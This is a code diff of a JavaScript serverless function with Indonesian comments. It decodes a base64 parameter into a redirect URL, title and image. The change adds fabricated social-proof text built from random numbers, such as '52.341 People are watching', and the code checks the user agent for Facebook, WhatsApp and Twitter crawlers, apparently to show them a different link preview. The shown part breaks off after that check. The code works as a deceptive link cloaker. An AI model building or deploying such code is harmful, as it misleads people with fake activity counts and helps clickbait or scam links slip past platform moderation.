@@ -1,18 +1,35 @@
 export async function onRequest(context) {
   const { searchParams } = new URL(context.request.url);
   const p = searchParams.get('p');
-  let u = 'https://google.com', t = '', i = '', d = '';
+  
+  // Link default kalau p kosong
+  let u = 'https://google.com', t = 'Loading...', i = '';
 
   if (p) {
     try {
       const decoded = atob(p);
       const params = new URLSearchParams(decoded);
       u = params.get('u') || u;
-      t = params.get('t') || '';
-      i = params.get('i') || '';
-      d = params.get('d') || '';
+      t = params.get('t') || t;
+      i = params.get('i') || i;
     } catch (e) {}
   }
+
+  // LOGIKA RANDOM DESKRIPSI
+  // Membuat angka random antara 10.000 sampai 100.000
+  const randomNum = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
+  // Format angka pake titik (misal: 52.341)
+  const formattedNum = randomNum.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+  
+  // Pilih variasi teks secara random
+  const variations = [
+    `${formattedNum} Online Members`,
+    `${formattedNum} Views Active`,
+    `${formattedNum} People are watching`,
+    `${formattedNum} Members Online`,
+    `${formattedNum} Active Now`
+  ];
+  const d = variations[Math.floor(Math.random() * variations.length)];
 
   const ua = context.request.headers.get('user-agent') || '';
   const isBot = /facebookexternalhit|Facebot|WhatsApp|Messenger|Twitterbot/i.test(ua);
